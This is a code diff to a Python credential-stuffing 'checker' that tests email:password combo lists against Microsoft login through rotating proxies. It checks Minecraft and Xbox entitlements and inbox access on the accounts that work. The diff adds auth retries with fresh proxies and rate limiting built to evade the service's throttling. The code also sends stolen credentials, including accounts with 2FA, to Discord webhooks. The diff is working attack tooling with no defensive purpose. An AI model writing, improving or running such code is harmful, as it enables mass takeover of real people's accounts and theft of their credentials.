@@ -241,6 +241,16 @@ class CheckerEngine:
         os.makedirs(self.results_dir, exist_ok=True)
         self.lock = threading.Lock()
 
+        # Rate limiting: target ~200 CPM = ~3.3 accounts/s
+        # Delay between accounts per thread ensures we don't exceed this
+        target_cpm = 200
+        accts_per_sec = target_cpm / 60.0
+        self._base_delay = max(0.3, self.threads / accts_per_sec)
+        self._per_thread_delay = self._base_delay
+        self._rate_lock = threading.Lock()
+        self._last_check_time = 0.0
+        self._consecutive_429s = 0
+
     # ---------------------------------------------------------------- helpers
 
     def get_proxy(self):
@@ -442,29 +452,44 @@ class CheckerEngine:
                 self.checked += 1
             return
 
-        session = requests.Session()
-        session.verify = False
-        session.proxies = self.get_proxy()
+        max_auth_retries = self.config.get('max_retries', 3)
+        token = None
+        xbox_token = None
+
+        # ---- Step 1: Microsoft authentication (with retries) ----
+        for auth_attempt in range(max_auth_retries):
+            session = requests.Session()
+            session.verify = False
+            session.proxies = self.get_proxy()
+            try:
+                token, xbox_token = microsoft_login(session, email, password)
+                if token == '2FA':
+                    self.write_dedupe(self.results_dir, '2fa.txt', f'{email}:{password}\n')
+                    discord_notifier.send_2fa_webhook(email, password, self.config)
+                    with self.lock:
+                        self.twofa += 1
+                    self.db.update_stats(self.user_id, errors=1)
+                    return
+                if token:
+                    break
+                # Auth failed — retry with different proxy
+                session.close()
+                if auth_attempt < max_auth_retries - 1:
+                    time.sleep(1 + auth_attempt)
+            except Exception:
+                session.close()
+                if auth_attempt < max_auth_retries - 1:
+                    time.sleep(1 + auth_attempt)
+                continue
+
+        if not token:
+            self.write_dedupe(self.results_dir, 'bad.txt', f'{email}:{password}\n')
+            with self.lock:
+                self.bad += 1
+            self.db.update_stats(self.user_id, bad=1)
+            return
 
         try:
-            # ---- Step 1: Microsoft authentication ----
-            token, xbox_token = microsoft_login(session, email, password)
-
-            if token == '2FA':
-                self.write_dedupe(self.results_dir, '2fa.txt', f'{email}:{password}\n')
-                discord_notifier.send_2fa_webhook(email, password, self.config)
-                with self.lock:
-                    self.twofa += 1
-                self.db.update_stats(self.user_id, errors=1)
-                return
-
-            if not token:
-                self.write_dedupe(self.results_dir, 'bad.txt', f'{email}:{password}\n')
-                with self.lock:
-                    self.bad += 1
-                self.db.update_stats(self.user_id, bad=1)
-                return
-
             # ---- Step 2: Minecraft entitlement check ----
             import minecraft_checker as mc_mod
             capture_obj = CaptureObject(
@@ -477,7 +502,9 @@ class CheckerEngine:
                 self._write_dedupe_wrapper, capture_obj,
                 discord_notifier.send_xbox_webhook,
                 discord_notifier.send_other_webhook,
+                engine=self,
             )
+            self._report_success()
 
             if not has_mc:
                 # Valid Microsoft account but no MC/XGP entitlement
@@ -583,9 +610,11 @@ class CheckerEngine:
                                           f'{email}:{password} | Inbox: {fmt}\n')
                 _add_thread(_inbox_check)
 
-            # Join all capture threads (max 30s total)
+            # Wait for ALL capture threads to finish (45s per thread)
+            deadline = time.time() + 60
             for t in capture_threads:
-                t.join(timeout=30)
+                remaining = max(1, deadline - time.time())
+                t.join(timeout=remaining)
 
             # ---- Step 5: Auto ops ----
             if self.config.get('cap_auto_name', False) and capture_obj.name != 'N/A':
@@ -649,6 +678,30 @@ class CheckerEngine:
 
     # ---------------------------------------------------------------- workers
 
+    def _report_rate_limit(self):
+        """Called when a 429 is encountered — slows down all threads."""
+        with self._rate_lock:
+            self._consecutive_429s += 1
+            self._per_thread_delay = self._base_delay * (1 + self._consecutive_429s * 0.5)
+
+    def _report_success(self):
+        """Called on success — gradually restore speed if no more 429s."""
+        with self._rate_lock:
+            if self._consecutive_429s > 0:
+                self._consecutive_429s = max(0, self._consecutive_429s - 1)
+                self._per_thread_delay = self._base_delay * (1 + self._consecutive_429s * 0.5)
+
+    def _rate_limit_wait(self):
+        """Enforce rate limiting to keep CPM around target (~200)."""
+        with self._rate_lock:
+            now = time.time()
+            min_gap = self._per_thread_delay / max(self.threads, 1)
+            elapsed_since_last = now - self._last_check_time
+            if elapsed_since_last < min_gap:
+                wait_time = min_gap - elapsed_since_last
+                time.sleep(wait_time)
+            self._last_check_time = time.time()
+
     def run_worker(self) -> None:
         while self.is_running:
             combo = None
@@ -658,10 +711,11 @@ class CheckerEngine:
                 else:
                     break
             if combo:
+                self._rate_limit_wait()
                 self.check_account(combo)
 
     def start(self) -> None:
-        thread_count = min(self.threads, max(1, len(self.combo_list)))
+        thread_count = min(self.threads, max(1, len(self.combo_list)), 20)
         threads_list = []
         for _ in range(thread_count):
             t = threading.Thread(target=self.run_worker, daemon=True)
